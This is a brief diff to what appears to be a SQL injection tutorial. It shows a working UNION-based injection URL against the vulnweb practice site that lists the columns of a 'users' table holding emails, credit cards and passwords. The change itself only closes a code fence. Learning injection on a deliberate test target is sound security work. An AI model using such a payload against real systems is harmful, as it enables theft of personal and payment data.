@@ -127,7 +127,7 @@ NB: set the value of the TABLE_NAME= to the table you are t5rying to get it colu
 
 As you can see we have the columns in the users table which are emails,creditcards,address,password e.t.c
 
-```http://testphp.vulnweb.com/artists.php?artist=-1+union+select+1,(SELECT+GROUP_CONCAT(column_name+SEPARATOR+%27::%27)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME='users'+AND+TABLE_SCHEMA=DATABASE()),3
+```http://testphp.vulnweb.com/artists.php?artist=-1+union+select+1,(SELECT+GROUP_CONCAT(column_name+SEPARATOR+%27::%27)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME='users'+AND+TABLE_SCHEMA=DATABASE()),3```
 
 let's proceed to the next step
 
